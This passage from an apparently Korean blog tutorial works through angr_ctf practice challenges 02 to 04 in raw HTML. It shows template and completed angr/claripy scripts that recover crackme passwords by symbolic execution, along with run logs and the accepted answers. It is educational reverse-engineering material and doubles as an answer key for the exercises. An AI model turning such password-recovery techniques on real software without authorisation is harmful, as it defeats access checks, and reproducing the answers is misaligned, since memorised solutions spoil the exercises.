class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">227</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804d291</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">02</span>_angr_find_condition (<span class="hljs-number">0x804d291</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57</span>,<span class="hljs-number">228</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804d293</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">02</span>_angr_find_condition (<span class="hljs-number">0x804d293</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">58</span>,<span class="hljs-number">865</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff2d</span> <span class="hljs-keyword">with</span> <span class="hljs-number">11</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8189f50</span> (strcmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x89f50</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">58</span>,<span class="hljs-number">865</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff50</span> <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8189f50</span> (strcmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x89f50</span>))<span class="hljs-string">b&apos;HETOBRCU&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">02</span>_angr_find_conditionEnter the password: HETOBRCUGood Job.</code></pre><h1 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h1><p><img src="/2021/08/04/j0ker/angr_part3/6.png" alt="./anrgr_part3/Untitled%206.png"></p><p>&#xC74C;&#x2026; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xD2B9;&#xC774;&#xD558;&#xAC8C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC774; &#xBCC0;&#xC218;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xAC8C; &#xB208;&#xC5D0; &#xB744;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xC778;&#xD48B;&#xB3C4; &#xC880; &#xB2E4;&#xB974;&#xAC8C; &#xBC1B;&#xB294;&#xAC70; &#xAC19;&#xC740;&#xB370;&#x2026; <code>get_user_input()</code>&#xC744; &#xD568; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/7.png" alt="./anrgr_part3/Untitled%207.png"></p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC55E;&#xC5D0;&#xC640;&#xB294; &#xB2EC;&#xB9AC; &#xC778;&#xD48B;&#xC744; 3&#xAC1C;&#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; angr&#xC5D0;&#xC11C;&#xB294; <code>scanf</code>&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xD48B; &#xC5EC;&#xB7EC;&#xAC1C; &#xBC1B;&#xB294;&#xAC83;&#xC744; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;&#xACE0;? &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xC57C;&#xD558;&#xB0D0;? &#xC77C;&#xB2E8; &#xC6D0;&#xB798; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0;&#xB294; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8;&#xBD80;&#xD130; &#xC9C4;&#xD589;&#xD588;&#xC5C8;&#xC8E0;. &#xC774;&#xAC70;&#xB97C; <code>scanf</code> &#xD568;&#xC218; &#xC774;&#xD6C4;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xC778;&#xC790;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACF3;&#xC744; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB85C; &#xC120;&#xC5B8;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xC8E0;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = ???  # :integer (probably hexadecimal)  initial_state = project.factory.blank_state(addr=start_address)  password0_size_in_bits = ???  # :integer  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, password0_size_in_bits)  ...  initial_state.regs.??? = password0  ...  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0)    ...    solution = ???  # :string    <span class="hljs-keyword">print</span> solution  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xBA3C;&#xC800; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC2DC;&#xC791;&#xD560; &#xC8FC;&#xC18C;&#xBD80;&#xD130; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">start_address = <span class="hljs-number">0x08048980</span>  <span class="hljs-comment"># :integer (probably hexadecimal)</span>initial_state = project.factory.blank_state(addr=start_address)</code></pre><p>&#xC544;&#xAE4C; &#xB9D0;&#xC500;&#xB4DC;&#xB838;&#xB2E4;&#xC2DC;&#xD53C; <code>scanf</code> &#xC774;&#xD6C4;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC57C;&#xD558;&#xB294;&#xB370;, &#xBA54;&#xC778;&#xD568;&#xC218;&#xC5D0; &#xC788;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xB77C; <code>get_user_input</code>&#xC5D0; &#xC788;&#xC5C8;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xC800;&#xB294; &#xBA54;&#xC778; &#xD568;&#xC218;&#xC5D0; <code>get_user_input</code> &#xC774;&#xD6C4;&#xB85C; &#xC124;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD73;&#xC774; <code>get_user_input</code> &#xC548;&#xC5D0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xC740; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD560; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xC73C;&#xB2C8;&#xAE4C;&#xC694;.</p><pre><code class="hljs python">password0_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, password0_size_in_bits)password1_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, password1_size_in_bits)password2_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>password2 = claripy.BVS(<span class="hljs-string">&apos;password2&apos;</span>, password2_size_in_bits)</code></pre><p>&#xC774;&#xC81C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xC120;&#xC5B8;&#xB9CC; &#xD574;&#xC8FC;&#xB294; &#xAC70;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. angr&#xC5D0;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xBCC0;&#xC218;&#xC758; type&#xC774; &#xBB54;&#xC9C0; &#xC2E0;&#xACBD; &#xC4F0;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBCC0;&#xC218;&#xC758; &#xD06C;&#xAE30;&#xB9CC; &#xC9C0;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC5D0; &#xBCC0;&#xC218;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; 32&#xBE44;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2C8;&#xAE4C; 32&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; 3&#xAC1C;&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">initial_state.regs.eax = password0initial_state.regs.ebx = password1initial_state.regs.edx = password2</code></pre><p>&#xC774;&#xC81C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; state&#xC5D0; &#xC801;&#xC6A9;&#xC744; &#xD574;&#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00;  &#xCD94;&#xC801;&#xD560; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC740; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xBA54;&#xC778; &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xAC01;&#xAC01; eax, ebx, edx&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC01;&#xAC01; &#xC120;&#xC5B8;&#xD55C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xB300;&#xC785;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xACB0;&#xACFC;&#xAC12;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC704; &#xC608;&#xC2DC; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xAC01;&#xAC01; hex &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xCD9C;&#xB825;&#xC744; &#xD574;&#xC8FC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xC544;<del>~</del>&#xC8FC; &#xC27D;&#xAC8C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs python">solution0 = solution_state.se.eval(password0)solution1 = solution_state.se.eval(password1)solution2 = solution_state.se.eval(password2)solution = <span class="hljs-string">&apos;{} {} {}&apos;</span>.format(hex(solution0), hex(solution1), hex(solution2))  <span class="hljs-comment"># :string</span>print(solution)</code></pre><h2 id="sol03-py"><a href="#sol03-py" class="headerlink" title="sol03.py"></a>sol03.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x08048980</span>  <span class="hljs-comment"># :integer (probably hexadecimal)</span>  initial_state = project.factory.blank_state(addr=start_address)  password0_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, password0_size_in_bits)  password1_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>  password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, password1_size_in_bits)  password2_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>  password2 = claripy.BVS(<span class="hljs-string">&apos;password2&apos;</span>, password2_size_in_bits)    initial_state.regs.eax = password0  initial_state.regs.ebx = password1  initial_state.regs.edx = password2  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0)    solution1 = solution_state.se.eval(password1)    solution2 = solution_state.se.eval(password2)        solution = <span class="hljs-string">&apos;{} {} {}&apos;</span>.format(hex(solution0), hex(solution1), hex(solution2))  <span class="hljs-comment"># :string</span>    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol03.py ./<span class="hljs-number">03</span>_angr_symbolic_registersWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">245</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048980</span> (main+<span class="hljs-number">0x26</span> <span class="hljs-keyword">in</span> <span class="hljs-number">03</span>_angr_symbolic_registers (<span class="hljs-number">0x8048980</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">14</span>,<span class="hljs-number">105</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-number">0xb9ffd04e</span> <span class="hljs-number">0xccf63fe8</span> <span class="hljs-number">0x8fd4d959</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">03</span>_angr_symbolic_registersEnter the password: <span class="hljs-number">0xb9ffd04e</span> <span class="hljs-number">0xccf63fe8</span> <span class="hljs-number">0x8fd4d959</span>Good Job.</code></pre><h1 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h1><p><img src="/2021/08/04/j0ker/angr_part3/8.png" alt="./anrgr_part3/Untitled%208.png"></p><p>&#xC790; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC785;&#xB825;&#xAC12;&#xB4E4;&#xC774; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB124;&#xC694;. &#xADF8;&#xB7FC; &#xC704;&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC744; initial state&#xC5D0; &#xC2A4;&#xD0DD;&#xC5D0; &#xB123;&#xC5B4;&#xC8FC;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; state&#xC5D0;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83; &#xCC98;&#xB7FC; &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC9C0; &#xC54A;&#xC744;&#xD150;&#xB370;&#x2026; &#xC774;&#xAC8C; &#xBB38;&#xC81C;&#xB124;&#xC694;!</p><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xC55E;&#xC5D0; &#xBB38;&#xC81C;&#xCC98;&#xB7FC; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB294; <code>scanf</code> &#xC774;&#xD6C4;&#xAC00; &#xB418;&#xC5B4;&#xC57C; &#xD560;&#xAC70;&#xACE0;&#xC694;&#x2026;. &#xADF8; &#xB4A4;&#xB85C;&#xB294; &#xBB58; &#xD574;&#xC57C;&#xD558;&#xC9C0;&#x2026; &#xC774;&#xB7F4; &#xB550; &#xCF54;&#xB4DC;&#xB97C; &#xBD05;&#xC2DC;&#xB2E4;!</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = ???  initial_state = project.factory.blank_state(addr=start_address)  initial_state.regs.ebp = initial_state.regs.esp  password0 = claripy.BVS(&apos;password0&apos;, ???)  ...  padding_length_in_bytes = ???  # :integer  initial_state.regs.esp -= padding_length_in_bytes  initial_state.stack_push(???)  # :bitvector (claripy.BVS, claripy.BVV, claripy.BV)  ...  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0)    ...    solution = ???    <span class="hljs-keyword">print</span> solution  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC774;&#xC804;&#xAE4C;&#xC9C0;&#xB294; &#xADF8;&#xB0E5; <code>scanf</code> &#xC774;&#xD6C4; &#xC5B4;&#xB514;&#xB4E0; &#xC0C1;&#xAD00;&#xC5C6;&#xACA0;&#xC9C0;&#xB77C;&#xB294; &#xB9C8;&#xC778;&#xB4DC;&#xB85C; &#xB300;&#xCDA9; &#xC9C0;&#xC815;&#xD588;&#xC9C0;&#xB9CC; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC880;&#xB9CC; &#xC790;&#xC138;&#xD788; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/9.png" alt="./angr_part3/Untitled%209.png"></p><p><code>scanf</code> &#xBC14;&#xB85C; &#xB4A4;&#xC758; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xBCF4;&#xBA74; esp&#xC5D0;&#xC11C; 0x10&#xC744; &#xB354;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; initial state&#xC5D0; &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD574;&#xC57C;&#xD560; &#xAC83;&#xC744; &#xC54C;&#xC558;&#xACE0;, &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xB294; &#xB300;&#xBD80;&#xBD84; esp&#xB098; ebp&#xB85C; &#xC870;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC77C;&#xB2E8; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xCC1C;&#xCC1C;&#xD558;&#xB2C8; <code>add esp, 0x10</code> &#xC774;&#xBD80;&#xBD84;&#xC740; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xBC14;&#xB85C; &#xB4A4;&#xBD80;&#xD130; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xC81C; &#xC2A4;&#xD0DD;&#xC5D0; &#xB300;&#xD55C; &#xD658;&#xACBD; &#xC138;&#xD305;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0;&#xB3C4; &#xC2A4;&#xD0DD;&#xC5D0; &#xC785;&#xB825;&#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC774; &#xC788;&#xC5C8;&#xC9C0;&#xB9CC; &#xC785;&#xB825;&#xAC12;&#xC744; &#xD558;&#xB098;&#xB9CC; &#xBC1B;&#xC544;&#xC11C; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8;&#xBD80;&#xD130; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD558;&#xBA74; &#xBB38;&#xC81C; &#xC5C6;&#xC774; angr&#xAC00; &#xC54C;&#xC544;&#xC11C; &#xBCC0;&#xC218;&#xAC00; &#xC2A4;&#xD0DD; &#xC5B4;&#xB514;&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xB294;&#xC9C0; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC9C0;&#xAE08;&#xC740; &#xADF8;&#xB7F0; &#xACFC;&#xC815;&#xC744; &#xB6F0;&#xC5B4;&#xB118;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; initial state&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD; &#xC0C1;&#xD669;&#xC744; &#xC124;&#xC815;&#xD574;&#xC904; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xB54C;&#xCC98;&#xB7FC; esp&#xB97C; ebp&#xC5D0; &#xB300;&#xC785;&#xD558;&#xACE0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC744; &#xC120;&#xC5B8;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">initial_state.regs.ebp = initial_state.regs.esppassword0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, <span class="hljs-number">32</span>)password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, <span class="hljs-number">32</span>)</code></pre><p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C; IDA&#xB85C; &#xC2A4;&#xD0DD;&#xC758; &#xD06C;&#xAE30;&#xC640; &#xBCC0;&#xC218;&#xC758; &#xC704;&#xCE58;&#xB4E4;&#xC744; &#xD30C;&#xC545;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/10.png" alt="./anrgr_part3/Untitled%2010.png"></p><p>&#xC77C;&#xB2E8; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC758; &#xD06C;&#xAE30;&#xB294; 0x18&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBCC0;&#xC218;&#xB4E4;&#xC774; <code>ebp-0xC</code>, <code>ebp-0x10</code>&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC8E0;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xBCC0;&#xC218; &#xD558;&#xB098;&#xB2F9; 4&#xBC14;&#xC774;&#xD2B8;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ebp&#xC5D0;&#xC11C; ebp-0x8&#xAE4C;&#xC9C0;&#xB294; &#xCD94;&#xC801;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xB294; &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xB4E4;&#xC774;&#xB124;&#xC694;! &#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC2A4;&#xD0DD;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xC8E0;!</p><pre><code class="hljs python">padding_length_in_bytes = <span class="hljs-number">8</span>  <span class="hljs-comment"># :integer</span>initial_state.regs.esp -= 